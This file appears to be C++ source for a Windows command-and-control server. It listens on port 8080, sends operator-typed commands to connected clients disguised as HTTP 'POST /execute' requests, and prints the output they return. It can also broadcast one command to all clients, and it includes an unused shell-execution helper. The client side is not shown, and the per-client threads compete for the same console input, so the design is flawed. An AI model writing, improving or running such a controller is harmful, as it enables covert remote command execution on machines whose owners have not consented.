#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <thread>
#include <mutex>
using namespace std;
#pragma comment(lib, "ws2_32.lib")

mutex clientMutex;
vector<SOCKET> clientSockets;  // Store all client sockets

string executeCommand(const string& command) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return "popen failed!";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

void handleClient(SOCKET clientSocket) {
    char buffer[1024];
    
    while (true) {
        string command;
        cout << "Enter command: ";
        getline(cin, command);

        if (command == "exit") break;

        // Send command to client
        ostringstream request;
        request << "POST /execute HTTP/1.1\r\nContent-Length: " << command.size() << "\r\n\r\n" << command;
        send(clientSocket, request.str().c_str(), request.str().size(), 0);

        // Receive response
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            cout << "Command output from client: \n" << buffer << endl;
        } else {
            cout << "Failed to receive response." << endl;
        }
    }

    // Close the client socket
    closesocket(clientSocket);
}

void sendToAllClients(const string& command) {
    lock_guard<mutex> lock(clientMutex);
    
    // Send the command to all connected clients
    for (SOCKET clientSocket : clientSockets) {
        ostringstream request;
        request << "POST /execute HTTP/1.1\r\nContent-Length: " << command.size() << "\r\n\r\n" << command;
        send(clientSocket, request.str().c_str(), request.str().size(), 0);
    }
}

int main() {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    char buffer[1024];

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed." << endl;
        return 1;
    }

    // Create socket
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        cout << "Socket creation failed." << endl;
        WSACleanup();
        return 1;
    }

    // Bind address and port
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(8080);

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Bind failed." << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Listen for incoming connections
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        cout << "Listen failed." << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    cout << "Server listening on port 8080..." << endl;

    while (true) {
        // Accept a client connection
        clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket == INVALID_SOCKET) {
            cout << "Accept failed." << endl;
            continue;
        }

        // Add client socket to list
        {
            lock_guard<mutex> lock(clientMutex);
            clientSockets.push_back(clientSocket);
        }

        cout << "Client connected. Spawning new thread to handle the client." << endl;

        // Spawn a thread to handle the client
        thread(handleClient, clientSocket).detach();  // Detach to allow independent execution
    }

    // Cleanup
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}

